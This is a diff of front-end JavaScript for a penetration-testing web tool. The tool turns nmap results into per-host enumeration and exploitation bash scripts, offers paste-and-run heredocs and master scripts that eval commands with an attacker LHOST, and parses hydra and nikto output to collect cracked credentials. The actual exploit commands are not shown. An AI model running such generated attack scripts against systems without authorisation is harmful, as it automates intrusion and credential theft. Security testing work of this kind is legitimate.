+    out.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:8px;color:var(--text3)"><div style="font-size:40px;opacity:.1">🔍</div><div style="font-size:12px">No interesting ports for ' + ip + '</div></div>';
+    return;
+  }
+
+  out.innerHTML = '';
+  const colorMap = {CRITICAL:'#cf222e',HIGH:'#bc4c00',MEDIUM:'#f59e0b',LOW:'#1a7f37',INFO:'#0a7ea4'};
+
+  // Deduplicate by port number — merge TCP+UDP into one block
+  const seen = {};
+  const deduped = [];
+  for (const p of (_activePort ? ports.filter(p => p.port === _activePort) : ports)) {
+    if (!seen[p.port]) { seen[p.port] = []; deduped.push(p); }
+    seen[p.port].push(p.proto);
+  }
+
+  for (const {port, proto, svc} of deduped) {
+    const protos = seen[port]; // e.g. ['UDP','TCP'] or ['TCP']
+    const protoLabel = protos.length > 1 ? protos.join('+') : proto;
+    const db = getPortEntry(port, svc);
+    const rc = colorMap[db.risk] || '#666688';
+    const script = _mode === 'xpl' ? generateExploitScript(ip, port, svc) : generateEnumScript(ip, port, svc);
+    const bId = 'b_' + ip.replace(/\./g,'_') + '_' + port;
+    window._SS[bId] = script;
+    // Heredoc-wrapped version for direct paste-and-run in terminal
+    const runScript = "bash << 'PENTEST'\n" + script + "\nPENTEST";
+    window._SS[bId + '_run'] = runScript;
+
+    const block = document.createElement('div');
+    block.className = 'tblock';
+    block.id = 'tblock_' + port;
+    block.style.transition = 'border-color .4s';
+    block.innerHTML =
+      '<div class="tblock-head">' +
+        '<span class="tport" style="color:' + db.color + ';border-color:' + db.color + '44">' + port + '/' + protoLabel + '</span>' +
+        '<span class="tsvc">' + db.name + '</span>' +
+        '<span class="trisk" style="color:' + rc + ';background:' + rc + '18">' + db.risk + '</span>' +
+        '<div class="tactions">' +
+          '<button class="btn btn-secondary btn-sm" onclick="cpScript(\''+ bId + '\',this)" title="Copy full script">📋 Copy</button>' +
+          '<button class="btn btn-run btn-sm" onclick="cpRun(\''+ bId + '\',this)" title="Copy as heredoc — paste directly into terminal and run">▶ Run</button>' +
+          '<button class="btn btn-dl btn-sm" onclick="dlScript(\''+ ip + '\',\'' + port + '\',\'' + svc + '\',\'' + (_mode==='xpl'?'xpl':'enum') + '\')">⬇ .sh</button>' +
+        '</div>' +
+      '</div>' +
+      '<pre class="term">' + colorizeScript(script) + '</pre>';
+    out.appendChild(block);
+  }
+}
+
+// ── CLEAR ───────────────────────────────────────────────────
+function clearAll() {
+  _hosts = {}; _activeHost = null; _activePort = null; _mode = 'enum'; window._SS = {};
+  document.getElementById('nmapIn').value = '';
+  document.getElementById('uploadOk').textContent = '';
+  document.getElementById('hostListWrap').style.display = 'none';
+  document.getElementById('portList').innerHTML = '<div class="empty-mid"><div class="empty-mid-ico">🔌</div><div class="empty-mid-t">Select a host</div></div>';
+  document.getElementById('portHostLabel').textContent = '';
+  document.getElementById('portCount').textContent = '';
+  document.getElementById('scriptOut').innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:10px;color:var(--text3)"><div style="font-size:48px;opacity:.1">📡</div><div style="font-size:13px">Upload a file or paste nmap output, then Generate</div></div>';
+  document.getElementById('rtool').style.display = 'none';
+  document.getElementById('statsbar').style.display = 'none';
+  const mb = document.getElementById('masterBtns'); if (mb) mb.style.display = 'none';
+  setModeTabActive();
+}
+
+// ── MODE / TABS ─────────────────────────────────────────────
+function setMode(m) {
+  _mode = m;
+  setModeTabActive();
+  // show/hide panels
+  const scriptOut = document.getElementById('scriptOut');
+  const aiPanel   = document.getElementById('aiPanel');
+  if (scriptOut) scriptOut.style.display = m === 'ai' ? 'none' : '';
+  if (aiPanel)   aiPanel.style.display   = m === 'ai' ? 'flex' : 'none';
+  if (m === 'summary') { renderSummary(); }
+  else if (m === 'analyze') { document.getElementById('rtool').style.display = 'flex'; renderAnalyzeTab(); }
+  else if (m === 'ai') { document.getElementById('rtool').style.display = 'flex'; }
+  else if (_activeHost) renderScripts();
+}
+
+function setModeTabActive() {
+  const modes = {enum:'active-enum', xpl:'active-xpl', summary:'active-sum', analyze:'active-az', ai:'active-ai'};
+  ['tabEnum','tabXpl','tabSum','tabAz','tabAI'].forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.className = 'mtab';
+  });
+  const map = {enum:'tabEnum', xpl:'tabXpl', summary:'tabSum', analyze:'tabAz', ai:'tabAI'};
+  const el = document.getElementById(map[_mode]);
+  if (el) el.className = 'mtab ' + (modes[_mode] || '');
+}
+
+// ── STATS ───────────────────────────────────────────────────
+function updateStats() {
+  const ips = Object.keys(_hosts);
+  let ports = 0, enumC = 0, xplC = 0, skip = 0;
+  for (const ip of ips) {
+    for (const p of _hosts[ip]) {
+      if (isEphemeralRPC(p.port, p.svc)) { skip++; continue; }
+      if (!isInteresting(p.port, p.svc)) continue;
+      ports++;
+      const db = getPortEntry(p.port, p.svc);
+      if ((db.enum||[]).filter(l=>l&&!l.startsWith('#')).length) enumC++;
+      if ((db.exploit||[]).filter(l=>l&&!l.startsWith('#')).length) xplC++;
+    }
+  }
+  document.getElementById('stHosts').textContent = ips.length;
+  document.getElementById('stPorts').textContent = ports;
+  document.getElementById('stEnum').textContent = enumC;
+  document.getElementById('stXpl').textContent = xplC;
+  document.getElementById('stSkip').textContent = skip;
+}
+
+// ── COPY / DOWNLOAD ─────────────────────────────────────────
+function cpScript(bId, btn) {
+  const s = window._SS[bId];
+  if (!s) return;
+  navigator.clipboard.writeText(typeof s === 'object' ? (s.enum||s) : s).then(() => {
+    const t = btn.textContent; btn.textContent = '✅'; setTimeout(() => btn.textContent = t, 1500);
+  });
+}
+
+function cpRun(bId, btn) {
+  const s = window._SS[bId + '_run'];
+  if (!s) return;
+  navigator.clipboard.writeText(s).then(() => {
+    const t = btn.textContent; btn.textContent = '✅ Copied!'; setTimeout(() => btn.textContent = t, 1800);
+  });
+}
+
+function cpMasterRun(type, btn) {
+  const script = generateMasterScript(type === 'xpl' ? 'xpl' : 'enum');
+  if (!script) { alert('No hosts loaded.'); return; }
+  const heredoc = "bash << 'PENTEST'\n" + script + "\nPENTEST";
+  navigator.clipboard.writeText(heredoc).then(() => {
+    const t = btn.textContent;
+    btn.textContent = '✅ Copied! Paste in terminal';
+    setTimeout(() => btn.textContent = t, 2500);
+  });
+}
+
+function cpQuick(btn) {
+  const cmd = btn.dataset.cmd;
+  navigator.clipboard.writeText(cmd).then(() => {
+    const t = btn.textContent; btn.textContent = '✅'; setTimeout(() => btn.textContent = t, 1000);
+  });
+}
+
+function escAttr(s) { return s.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function colorizeScript(script) {
+  // Convert bash script to colored HTML
+  return script
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .split('\n').map(line => {
+      if (line.startsWith('#!/')) return '<span class="d">' + line + '</span>';
+      if (line.startsWith('# ═') || line.startsWith('# ─')) return '<span class="d">' + line + '</span>';
+      if (/^#\s*⚠/.test(line)) return '<span class="w">' + line + '</span>';
+      if (/^#\s*\[BRUTE SKIP\]|#\s*\[MSF SKIP\]/.test(line)) return '<span class="d">' + line + '</span>';
+      if (/^#/.test(line)) return '<span class="c">' + line + '</span>';
+      if (/^echo.*╔|echo.*╚|echo.*║/.test(line)) return '<span class="h">' + line + '</span>';
+      if (/^echo.*\[✔\]/.test(line)) return '<span class="s">' + line + '</span>';
+      if (/^(RED|GRN|YLW|CYN|BLU|BLD|NC)=/.test(line)) return '<span class="d">' + line + '</span>';
+      if (/^(IP|PORT|SVC|LHOST|OUTDIR|WORDLIST)=/.test(line)) return '<span class="v">' + line + '</span>';
+      if (/^mkdir|^log |^ok |^warn |^run /.test(line)) return '<span class="g">' + line + '</span>';
+      if (/\$IP|\$PORT/.test(line)) return '<span class="i">' + line + '</span>';
+      if (/msfconsole|meterpreter|exploit\//.test(line)) return '<span class="r">' + line + '</span>';
+      if (/hydra|medusa|ncrack|brute/.test(line)) return '<span class="y">' + line + '</span>';
+      return line;
+    }).join('\n');
+}
+
+// ── Helpers ───────────────────────────────────────────────────────────────────
+
+function escAttr(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function getQuickCmd(db, ip, port, svc) {
+  for (const c of (db.enum || [])) {
+    const t = c.trim();
+    if (t && !t.startsWith('#')) {
+      return t
+        .replace(/\{IP\}/g, ip).replace(/\{PORT\}/g, port)
+        .replace(/\{OUTDIR\}/g, '.').replace(/\{LHOST\}/g, 'ATTACKER_IP')
+        .replace(/\{WORDLIST\}/g, '/usr/share/wordlists/dirb/common.txt')
+        .replace(/\{user\}/g, 'admin').replace(/\{pass\}/g, 'password')
+        .replace(/\{SVC\}/g, svc || db.name)
+        .split('\n')[0].trim();   // first line only (no heredoc body)
+    }
+  }
+  return 'nmap -sV -p ' + port + ' ' + ip;
+}
+
+
+
+function downloadSelectedEnum() {
+  if (!_activeHost) { alert('Select a host first.'); return; }
+  dlAllForHost(_activeHost, 'enum');
+}
+
+function downloadSelectedExploit() {
+  if (!_activeHost) { alert('Select a host first.'); return; }
+  dlAllForHost(_activeHost, 'xpl');
+}
+
+function generateMasterScript(type) {
+  const mode = type || 'all';
+  const hosts = Object.keys(_hosts);
+  if (!hosts.length) return '';
+  const date = new Date().toISOString().split('T')[0];
+  const outDir = document.getElementById('outDir').value.trim() || './results';
+  const wordlist = document.getElementById('wordlist').value.trim() || '/usr/share/wordlists/dirb/common.txt';
+  const modeLabel = mode === 'enum' ? 'ENUMERATION' : mode === 'xpl' ? 'EXPLOITATION' : 'ENUM + EXPLOIT';
+
+  let lines = [
+    '#!/bin/bash',
+    '# ' + '\u2550'.repeat(60),
+    '#  MASTER ' + modeLabel + ' SCRIPT -- AA-VAPT / nmap-pt',
+    '#  Generated : ' + date,
+    '#  Hosts     : ' + hosts.length,
+    '#  Mode      : ' + modeLabel,
+    '# ' + '\u2550'.repeat(60),
+    '',
+    'RED="\\033[0;31m"; GRN="\\033[0;32m"; YLW="\\033[0;33m"',
+    'CYN="\\033[0;36m"; BLU="\\033[0;34m"; MAG="\\033[0;35m"; BLD="\\033[1m"; NC="\\033[0m"',
+    '',
+    'OUTDIR="${OUTDIR:-$(pwd)/results}"',
+    'LHOST="${LHOST:-YOUR_ATTACKER_IP}"',
+    'WORDLIST="${WORDLIST:-' + wordlist + '}"',
+    'TARGET_USER="${TARGET_USER:-admin}"',
+    'TARGET_PASS="${TARGET_PASS:-}"',
+    '',
+    'log()  { echo -e "${BLD}[*]${NC} $1"; }',
+    'ok()   { echo -e "${GRN}[+]${NC} $1"; }',
+    'warn() { echo -e "${YLW}[!]${NC} $1"; }',
+    'xpl()  { echo -e "${MAG}[X]${NC} $1"; }',
+    'run()  { echo -e "${CYN}[>]${NC} $@"; eval "$@"; echo; }',
+    '',
+    'mkdir -p "$OUTDIR"',
+    '',
+  ];
+
+  for (const ip of hosts) {
+    const ports = _hosts[ip].filter(p => isInteresting(p.port, p.svc));
+    if (!ports.length) continue;
+
+    const hdr = mode === 'xpl' ? 'MAG' : 'BLU';
+    lines.push('');
+    lines.push('echo -e "\\n${BLD}${' + hdr + '}\u2554' + '\u2550'.repeat(54) + '\u2557${NC}"');
+    lines.push('echo -e "${BLD}${' + hdr + '}\u2551  HOST: ' + ip + '${NC}"');
+    lines.push('echo -e "${BLD}${' + hdr + '}\u255a' + '\u2550'.repeat(54) + '\u255d${NC}\\n"');
+    lines.push('IP="' + ip + '"');
+    lines.push('mkdir -p "$OUTDIR/$IP"');
+    lines.push('');
+
+    for (const {port, proto, svc} of ports) {
+      const db = getPortEntry(port, svc);
+      const hasEnum    = db.enum    && db.enum.length;
+      const hasExploit = db.exploit && db.exploit.length;
+      if (mode === 'enum' && !hasEnum)    continue;
+      if (mode === 'xpl'  && !hasExploit) continue;
+
+      lines.push('# --- ' + port + '/' + proto + ' ' + db.name + ' ' + db.risk + ' ---');
+      lines.push('PORT="' + port + '"; SVC="' + svc + '"');
+      lines.push('PORTDIR="$OUTDIR/$IP/port_' + port + '"; mkdir -p "$PORTDIR"');
+      lines.push('');
+
+      if (mode !== 'xpl' && hasEnum) {
+        lines.push('log "ENUM ' + db.name + ' $IP:' + port + '"');
+        lines.push(buildCmds(db.enum, ip, port, svc));
+        lines.push('');
+      }
+      if (mode !== 'enum' && hasExploit) {
+        lines.push('xpl "EXPLOIT ' + db.name + ' $IP:' + port + '"');
+        lines.push(buildCmds(db.exploit, ip, port, svc));
+        lines.push('');
+      }
+    }
+    lines.push('ok "Finished ' + ip + '"');
+    lines.push('');
+  }
+
+  lines.push('ok "All done. Results: $OUTDIR"');
+  return lines.join('\n');
+}
+
+function downloadMasterScript(type) {
+  const hosts = Object.keys(_hosts);
+  if (!hosts.length) { alert('No hosts loaded.'); return; }
+  const mode  = type || 'all';
+  const script = generateMasterScript(mode);
+  const label  = mode === 'enum' ? 'master_enum' : mode === 'xpl' ? 'master_exploit' : 'master_all';
+  const blob = new Blob([script], {type: 'text/plain'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = label + '_' + new Date().toISOString().slice(0,10) + '.sh';
+  a.click();
+}
+
+// ── Download helpers ─────────────────────────────────────────────────────────
+
+function dlScript(ip, port, svc, type) {
+  const script = type === 'enum'
+    ? generateEnumScript(ip, port, svc)
+    : generateExploitScript(ip, port, svc);
+  const fname = ip.replace(/\./g,'-') + '_' + port + '_' + (type === 'enum' ? 'enum' : 'exploit') + '.sh';
+  const blob = new Blob([script], {type: 'text/plain'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = fname;
+  a.click();
+}
+
+async function dlAllForHost(ip, type) {
+  if (typeof JSZip === 'undefined') { alert('JSZip failed to load — check your internet and refresh.'); return; }
+  const ports = (_hosts[ip] || []).filter(p => isInteresting(p.port, p.svc));
+  if (!ports.length) { alert('No interesting ports found for ' + ip); return; }
+  const zip = new JSZip();
+  for (const {port, svc} of ports) {
+    if (type !== 'xpl')  zip.file(ip.replace(/\./g,'-') + '_' + port + '_enum.sh',    generateEnumScript(ip, port, svc));
+    if (type !== 'enum') zip.file(ip.replace(/\./g,'-') + '_' + port + '_exploit.sh', generateExploitScript(ip, port, svc));
+  }
+  const blob = await zip.generateAsync({type:'blob'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = ip.replace(/\./g,'-') + '_scripts.zip';
+  a.click();
+}
+
+async function downloadAllZip() {
+  if (typeof JSZip === 'undefined') { alert('JSZip failed to load — check your internet and refresh.'); return; }
+  const hosts = Object.keys(_hosts);
+  if (!hosts.length) { alert('No hosts loaded.'); return; }
+  const zip = new JSZip();
+  for (const ip of hosts) {
+    const ports = _hosts[ip].filter(p => isInteresting(p.port, p.svc));
+    for (const {port, svc} of ports) {
+      zip.file(ip.replace(/\./g,'-') + '_' + port + '_enum.sh',    generateEnumScript(ip, port, svc));
+      zip.file(ip.replace(/\./g,'-') + '_' + port + '_exploit.sh', generateExploitScript(ip, port, svc));
+    }
+  }
+  const blob = await zip.generateAsync({type:'blob'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'all_pt_scripts.zip';
+  a.click();
+}
+
+// ── Init ─────────────────────────────────────────────────────────────────────
+document.addEventListener('DOMContentLoaded', () => {
+  const zone = document.getElementById('upZone');
+  if (zone) {
+    zone.addEventListener('dragover',  e => { e.preventDefault(); zone.classList.add('drag-over'); });
+    zone.addEventListener('dragleave', () => zone.classList.remove('drag-over'));
+    zone.addEventListener('drop', e => {
+      e.preventDefault(); zone.classList.remove('drag-over');
+      if (e.dataTransfer.files.length) handleFiles(e.dataTransfer.files);
+    });
+  }
+});
+
+// ══════════════════════════════════════════════════════════════════════════════
+// 🔬 OUTPUT ANALYZER — parse nmap -oN, hydra, enum4linux output files
+// ══════════════════════════════════════════════════════════════════════════════
+// _aFindings, _aCreds, _aFiles, _aTab declared at top of script
+
+const SEV_ORD  = {CRITICAL:0,HIGH:1,MEDIUM:2,LOW:3,INFO:4};
+function sevOrd(s){ return SEV_ORD[s] ?? 99; }
+
+function renderAnalyzeTab() {
+  const out = document.getElementById('scriptOut');
+  const crit = _aFindings.filter(f=>f.sev==='CRITICAL').length;
+  const high = _aFindings.filter(f=>f.sev==='HIGH').length;
+  const med  = _aFindings.filter(f=>f.sev==='MEDIUM').length;
+  const low  = _aFindings.filter(f=>f.sev==='LOW').length;
+
+  out.innerHTML = `
+  <style>
+    .az-upzone{border:2px dashed var(--border);border-radius:10px;padding:22px;text-align:center;margin:12px;background:var(--bg3);cursor:pointer;transition:.2s}
+    .az-upzone:hover{border-color:#8250df;background:var(--bg4)}
+    .az-statsbar{display:flex;background:var(--bg3);border-bottom:1px solid var(--border)}
+    .az-stat{flex:1;padding:8px;text-align:center;border-right:1px solid var(--border)}
+    .az-stat:last-child{border:none}
+    .az-stat .sv{font-size:18px;font-weight:800}
+    .az-stat .sl{font-size:9px;color:var(--text3)}
+    .az-tabs{display:flex;background:var(--bg3);border-bottom:1px solid var(--border)}
+    .az-tab{padding:7px 14px;font-size:11px;font-weight:600;cursor:pointer;color:var(--text3);border-bottom:2px solid transparent}
+    .az-tab.active{color:#8250df;border-bottom-color:#8250df}
+    .az-body{padding:12px;overflow-y:auto;max-height:calc(100vh - 320px)}
+    .fcrd{background:var(--bg3);border:1px solid var(--border);border-radius:7px;margin-bottom:8px;overflow:hidden}
+    .fcrd-hd{padding:9px 12px;display:flex;align-items:center;gap:7px;cursor:pointer}
+    .fcrd-hd:hover{background:var(--bg4)}
+    .fcrd-body{display:none;padding:10px 12px;border-top:1px solid var(--border)}
+    .fcrd.open .fcrd-body{display:block}
+    .fcrd-body pre{font-size:11px;color:var(--text2);white-space:pre-wrap;word-break:break-all;background:var(--bg);border-radius:5px;padding:8px;max-height:250px;overflow-y:auto}
+    .sb{font-size:10px;font-weight:800;padding:2px 7px;border-radius:4px}
+    .sb-CRITICAL{background:rgba(239,68,68,.15);color:#cf222e;border:1px solid rgba(239,68,68,.3)}
+    .sb-HIGH{background:rgba(249,115,22,.15);color:#bc4c00;border:1px solid rgba(249,115,22,.3)}
+    .sb-MEDIUM{background:rgba(245,158,11,.15);color:#f59e0b;border:1px solid rgba(245,158,11,.3)}
+    .sb-LOW{background:rgba(34,197,94,.15);color:#1a7f37;border:1px solid rgba(34,197,94,.3)}
+    .sb-INFO{background:rgba(79,195,247,.1);color:#0a7ea4;border:1px solid rgba(79,195,247,.2)}
+    .itag{font-size:10px;padding:1px 7px;border-radius:4px;background:rgba(79,195,247,.08);color:var(--accent);border:1px solid rgba(79,195,247,.2);font-family:monospace;font-weight:700}
+    .ptag{font-size:10px;padding:1px 6px;border-radius:4px;background:var(--bg4);color:var(--text2);font-family:monospace}
+    .ctag{font-size:10px;padding:1px 6px;border-radius:4px;background:rgba(239,68,68,.1);color:#cf222e;border:1px solid rgba(239,68,68,.2);font-family:monospace}
+    .cred-row{background:var(--bg3);border:1px solid rgba(239,68,68,.25);border-radius:6px;padding:9px 12px;margin-bottom:7px;display:flex;align-items:center;gap:9px;font-size:12px}
+    .htbl{width:100%;border-collapse:collapse;font-size:12px}
+    .htbl th{background:var(--bg4);padding:7px 10px;text-align:left;font-size:10px;color:var(--text3);border-bottom:1px solid var(--border)}
+    .htbl td{padding:6px 10px;border-bottom:1px solid rgba(30,58,95,.5)}
+  </style>
+  <div class="az-upzone" onclick="document.getElementById('azFileIn').click()">
+    <input type="file" id="azFileIn" multiple accept=".txt,.nmap,.gnmap,.log,.out,.xml" style="display:none" onchange="azHandleFiles(this.files)">
+    <input type="file" id="azFolderIn" webkitdirectory multiple style="display:none" onchange="azHandleFiles(this.files)">
+    <div style="font-size:26px;margin-bottom:6px">📂</div>
+    <div style="font-size:12px;color:var(--text2)">Drop <b>output files</b> from generated scripts here</div>
+    <div style="font-size:10px;color:var(--text3);margin-top:3px">nmap -oN files · hydra logs · enum4linux</div>
+    <div style="display:flex;gap:6px;justify-content:center;margin-top:8px">
+      <button class="btn btn-sm" onclick="event.stopPropagation();document.getElementById('azFileIn').click()">📄 Files</button>
+      <button class="btn btn-sm" onclick="event.stopPropagation();document.getElementById('azFolderIn').click()">📁 Folder</button>
+      ${_aFiles.length ? `<button class="btn btn-sm" style="color:var(--red)" onclick="event.stopPropagation();azClear()">✕ Clear</button>` : ''}
+    </div>
+    <div id="azUok" style="margin-top:8px;font-size:11px;color:var(--text2)">${_aFiles.length ? '✅ '+_aFiles.length+' file(s) loaded' : ''}</div>
+  </div>
+
+  <div class="az-statsbar">
+    <div class="az-stat"><div class="sv" style="color:#cf222e">${crit}</div><div class="sl">CRITICAL</div></div>
+    <div class="az-stat"><div class="sv" style="color:#bc4c00">${high}</div><div class="sl">HIGH</div></div>
+    <div class="az-stat"><div class="sv" style="color:#f59e0b">${med}</div><div class="sl">MEDIUM</div></div>
+    <div class="az-stat"><div class="sv" style="color:#1a7f37">${low}</div><div class="sl">LOW</div></div>
+    <div class="az-stat"><div class="sv" style="color:#cf222e">${_aCreds.length}</div><div class="sl">CREDS</div></div>
+  </div>
+
+  <div class="az-tabs">
+    <div class="az-tab ${_aTab==='findings'?'active':''}" onclick="azSetTab('findings')">🔍 Findings (${_aFindings.length})</div>
+    <div class="az-tab ${_aTab==='creds'?'active':''}" onclick="azSetTab('creds')">🔑 Credentials (${_aCreds.length})</div>
+    <div class="az-tab ${_aTab==='report'?'active':''}" onclick="azSetTab('report')">📄 Report</div>
+  </div>
+  <div class="az-body" id="azBody"></div>`;
+
+  // Attach drag events
+  const upzone = out.querySelector('.az-upzone');
+  if (upzone) {
+    upzone.addEventListener('dragover', e => { e.preventDefault(); upzone.style.borderColor='#8250df'; });
+    upzone.addEventListener('dragleave', () => { upzone.style.borderColor=''; });
+    upzone.addEventListener('drop', e => { e.preventDefault(); upzone.style.borderColor=''; azHandleFiles(e.dataTransfer.files); });
+  }
+
+  azRenderTab();
+}
+
+async function azHandleFiles(fileList) {
+  if (!fileList || !fileList.length) return;
+  const uok = document.getElementById('azUok');
+  if (uok) { uok.textContent = '⏳ Parsing...'; uok.style.color = 'var(--text2)'; }
+
+  const supported = ['.txt','.nmap','.gnmap','.xml','.log','.out'];
+  const files = Array.from(fileList).filter(f => supported.some(e => f.name.toLowerCase().endsWith(e)));
+  let loaded = 0, skipped = 0;
+
+  for (const file of files) {
+    try {
+      const text = await file.text();
+      const ftype = azDetectType(text, file.name);
+      if      (ftype === 'nmap')       azParseNmap(text, file.name);
+      else if (ftype === 'hydra')      azParseHydra(text, file.name);
+      else if (ftype === 'enum4linux') azParseEnum4linux(text, file.name);
+      else if (ftype === 'nikto')      azParseNikto(text, file.name);
+      else if (ftype === 'gobuster')   azParseGobuster(text, file.name);
+      else if (ftype === 'dnsrecon')   azParseDnsrecon(text, file.name);
+      else if (ftype === 'smbclient')  azParseSmbclient(text, file.name);
+      else if (ftype === 'whatweb')    azParseWhatweb(text, file.name);
+      else { skipped++; continue; }
+      _aFiles.push({name: file.name, type: ftype});
+      loaded++;
+    } catch(e) { skipped++; }
+  }
+  if (uok) {
+    uok.style.color = loaded ? 'var(--green)' : 'var(--red)';
+    uok.textContent = loaded ? `✅ ${loaded} file(s) parsed` + (skipped?` · ${skipped} skipped`:'') : '❌ No supported files';
+  }
+  renderAnalyzeTab();
+}
+
+function azDetectType(text, name) {
+  const n = name.toLowerCase();
+  // Hydra
+  if (n.includes('hydra') || (text.includes('[') && text.includes('login:') && text.includes('password:'))) return 'hydra';
+  // Enum4linux
+  if (n.includes('enum4linux') || text.includes('enum4linux')) return 'enum4linux';
+  // Nmap
+  if (text.includes('Nmap scan report') || text.includes('# Nmap') || text.includes('Starting Nmap')) return 'nmap';
+  // Nikto
+  if (n.includes('nikto') || text.includes('- Nikto') || text.includes('+ Nikto') || text.includes('OSVDB-')) return 'nikto';
+  // Gobuster / dirb / ffuf
+  if (n.includes('gobuster') || n.includes('dirb') || n.includes('ffuf') ||
+      text.includes('Gobuster') || /^(\/\S+)\s+(Status:|Found:|\(\d)/.test(text) ||
+      text.includes('FOUND:') || (text.includes('Status:') && text.includes('Length:'))) return 'gobuster';
+  // DNSrecon / dnsenum
+  if (n.includes('dnsrecon') || n.includes('dnsenum') || text.includes('dnsrecon') ||
+      text.includes('[*] Performing') || text.includes('Zone Transfer')) return 'dnsrecon';
+  // smbclient / impacket
+  if (n.includes('smb') || n.includes('smbclient') || text.includes('smb:') ||
+      text.includes('Disk') && text.includes('IPC$') || text.includes('sharename')) return 'smbclient';
+  // WhatWeb
+  if (n.includes('whatweb') || text.includes('WhatWeb') || /^\[http/.test(text)) return 'whatweb';
+  return 'unknown';
+}
+
+function azParseNmap(text, fname) {
+  const ipM = text.match(/Nmap scan report for (\S+)/);
+  const ip  = ipM ? ipM[1] : (text.match(/(\d{1,3}(?:\.\d{1,3}){3})/) || [])[1] || fname;
+
+  // Ports
+  const portRe = /^(\d+)\/(tcp|udp)\s+open\s+(\S+)\s*(.*)/gm;
+  let m;
+  while ((m = portRe.exec(text)) !== null) {
+    const [,port,proto,svc,ver] = m;
+    azAddFinding('INFO', `Open Port ${port}/${proto} · ${svc} ${ver.trim()}`.trim(), ip, port, proto, svc, [], '');
+  }
+
+  // VULNERABLE blocks
+  const vulnRe = /VULNERABLE:([\s\S]*?)(?=\n\n|\nNmap|\nHost|\n\|_|\Z)/g;
+  while ((m = vulnRe.exec(text)) !== null) {
+    const block = m[0];
+    const cves  = azExtractCVEs(block);
+    const title = azVulnTitle(block) || 'Vulnerability Found';
+    const sev   = azVulnSev(block, '');
+    azAddFinding(sev, title, ip, '', 'tcp', '', cves, block.trim());
+  }
+
+  // Script output blocks - find vuln/interesting scripts
+  const scriptRe = /\| ([\w\-]+):\s*\n((?:\|.*\n)*)/g;
+  while ((m = scriptRe.exec(text)) !== null) {
+    const sname = m[1], sbody = m[2];
+    const sl = sname.toLowerCase();
+    if (sl.includes('vuln') || sbody.includes('VULNERABLE') || sbody.includes('CVE:')) {
+      const cves = azExtractCVEs(sbody);
+      const sev  = azVulnSev(sbody, sname);
+      azAddFinding(sev, azScriptTitle(sname, sbody), ip, '', 'tcp', sl.includes('smb')?'smb':sl.includes('ftp')?'ftp':'', cves, sbody.trim());
+    } else if (sl === 'http-title') {
+      const t = sbody.replace(/[|\s\n]/g,' ').trim();
+      if (t) azAddFinding('INFO', `HTTP Title: ${t}`, ip, '80', 'tcp', 'http', [], sbody.trim());
+    } else if (sl === 'ftp-anon' && sbody.includes('allowed')) {
+      azAddFinding('HIGH', 'FTP Anonymous Login Allowed', ip, '21', 'tcp', 'ftp', [], sbody.trim());
+    } else if (sl === 'smb-enum-shares') {
+      azAddFinding('MEDIUM', 'SMB Shares Enumerable', ip, '445', 'tcp', 'smb', [], sbody.trim());
+    } else if (sl === 'smb-security-mode' && sbody.includes('guest')) {
+      azAddFinding('HIGH', 'SMB Guest/Null Access Allowed', ip, '445', 'tcp', 'smb', [], sbody.trim());
+    }
+  }
+}
+
+function azParseHydra(text, fname) {
+  const re = /\[(\d+)\]\[([\w\-]+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(\S*)/g;
+  let m;
+  while ((m = re.exec(text)) !== null) {
+    const [,port,proto,ip,user,pass] = m;
+    if (!_aCreds.some(c=>c.ip===ip&&c.user===user&&c.pass===pass)) {
+      _aCreds.push({ip,port,proto,user,pass});
+      azAddFinding('CRITICAL', `Credentials Found: ${proto.toUpperCase()} ${ip}:${port}`, ip, port, 'tcp', proto, [], `user: ${user}\npass: ${pass}`);
+    }
+  }
+}
+
+function azParseEnum4linux(text, fname) {
+  const ip = (text.match(/(\d{1,3}(?:\.\d{1,3}){3})/) || [])[1] || '';
+  if (text.includes('Null sessions are enabled') || (text.includes('IPC$') && text.includes('anonymous'))) {
+    azAddFinding('HIGH', 'SMB Null Session Enabled', ip, '445', 'tcp', 'smb', [], 'Null session authentication possible');
+  }
+  const users = [...(text.matchAll(/user:\[(\w+)\]/g))].map(u=>u[1]);
+  if (users.length) azAddFinding('MEDIUM', `SMB Users: ${users.join(', ')}`, ip, '445', 'tcp', 'smb', [], users.join('\n'));
+  const shares = [...(text.matchAll(/Sharename\s+Type.*\n([\s\S]*?)(?=\n\n)/g))].map(s=>s[0]);
+  if (shares.length) azAddFinding('MEDIUM', 'SMB Shares Enumerated', ip, '445', 'tcp', 'smb', [], shares.join('\n'));
+}
+
+// ── Nikto parser ────────────────────────────────────────────
+function azParseNikto(text, fname) {
+  const ipM = text.match(/Target IP:\s+(\S+)/) || text.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
+  const ip   = ipM ? ipM[1] : '';
+  const portM = text.match(/Target Port:\s+(\d+)/) || text.match(/:(\d+)/);
+  const port  = portM ? portM[1] : '80';
+  const lines = text.split('\n');
+  for (const line of lines) {
+    const l = line.trim();
+    if (!l.startsWith('+') && !l.startsWith('-')) continue;
+    const cves = azExtractCVEs(l);
+    const osvdb = (l.match(/OSVDB-(\d+)/g) || []);
+    let sev = 'INFO';
+    if (/sql injection|xss|rce|remote code|command injection|traversal|lfi|rfi|shellshock/i.test(l)) sev = 'CRITICAL';
+    else if (/password|credential|auth bypass|default pass|admin|backup|config file|phpinfo/i.test(l)) sev = 'HIGH';
+    else if (/outdated|vulnerable|osvdb|cve|misconfigur|header missing|clickjack|cors/i.test(l)) sev = 'MEDIUM';
+    const title = l.replace(/^\+\s*|-\s*/,'').substring(0,80).trim();
